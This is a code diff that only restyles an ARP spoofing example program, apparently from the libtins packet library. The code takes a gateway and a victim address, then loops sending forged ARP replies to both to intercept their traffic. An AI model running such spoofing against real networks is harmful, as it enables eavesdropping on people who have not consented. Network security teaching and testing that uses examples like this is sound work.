@@ -44,13 +44,17 @@
 #include <tins/ethernetII.h>
 #include <tins/packet_sender.h>
 
-using namespace std;
+using std::cout;
+using std::runtime_error;
+using std::endl;
+
 using namespace Tins;
 
 
-void do_arp_spoofing(NetworkInterface iface, IPv4Address gw, IPv4Address victim, 
-  const NetworkInterface::Info &info) 
-{
+void do_arp_spoofing(NetworkInterface iface, 
+                     IPv4Address gw,
+                     IPv4Address victim, 
+                     const NetworkInterface::Info& info) {
     PacketSender sender;
     EthernetII::address_type gw_hw, victim_hw;
     
@@ -79,7 +83,7 @@ void do_arp_spoofing(NetworkInterface iface, IPv4Address gw, IPv4Address victim,
      * performed by any routers. */
     EthernetII to_gw = EthernetII(gw_hw, info.hw_addr) / gw_arp;
     EthernetII to_victim = EthernetII(victim_hw, info.hw_addr) / victim_arp;
-    while(true) {
+    while (true) {
         // Just send them once every 5 seconds.
         sender.send(to_gw, iface);
         sender.send(to_victim, iface);
@@ -91,9 +95,11 @@ void do_arp_spoofing(NetworkInterface iface, IPv4Address gw, IPv4Address victim,
     }
 }
 
-int main(int argc, char *argv[]) {
-    if(argc != 3 && cout << "Usage: " << *argv << " <Gateway> <Victim>\n")
+int main(int argc, char* argv[]) {
+    if (argc != 3) {
+        cout << "Usage: " <<* argv << " <Gateway> <Victim>" << endl;
         return 1;
+    }
     IPv4Address gw, victim;
     EthernetII::address_type own_hw;
     try {
@@ -101,7 +107,7 @@ int main(int argc, char *argv[]) {
         gw     = argv[1];
         victim = argv[2];
     }
-    catch(...) {
+    catch (...) {
         cout << "Invalid ip found...\n";
         return 2;
     }
@@ -115,15 +121,15 @@ int main(int argc, char *argv[]) {
         // Find the interface hardware and ip address.
         info = iface.addresses();
     }
-    catch(std::runtime_error &ex) {
+    catch (runtime_error& ex) {
         cout << ex.what() << endl;
         return 3;
     }
     try {
         do_arp_spoofing(iface, gw, victim, info);
     }
-    catch(std::runtime_error &ex) {
-        std::cout << "Runtime error: " << ex.what() << std::endl;
+    catch (runtime_error& ex) {
+        cout << "Runtime error: " << ex.what() << endl;
         return 7;
     }
 }
